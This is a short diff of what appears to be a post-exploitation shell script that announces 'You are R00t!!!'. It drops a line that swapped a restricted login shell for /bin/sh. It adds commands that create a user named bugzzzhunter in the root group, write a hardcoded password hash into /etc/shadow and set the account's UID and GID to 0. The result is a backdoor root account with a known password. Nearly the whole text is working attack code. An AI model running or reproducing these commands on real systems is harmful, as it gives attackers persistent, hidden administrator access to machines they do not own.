@@ -1,3 +1,5 @@
 
 ncecho '[*]You are R00t!!!'
-sed -i 's#/usr/sbin/cli#/bin/sh#g' /etc/passwd
+adduser -s /bin/sh -D -H -G root bugzzzhunter
+sed -i 's#bugzzzhunter:!:#bugzzzhunter:$1$pTOIYZdJ$qNjIhQxJIymF.8vSkrfr50:#g' /etc/shadow
+sed -i -e 's/^\(bugzzzhunter:[^:]\):[0-9]*:[0-9]*:/\1:0:0:/' /etc/passwd
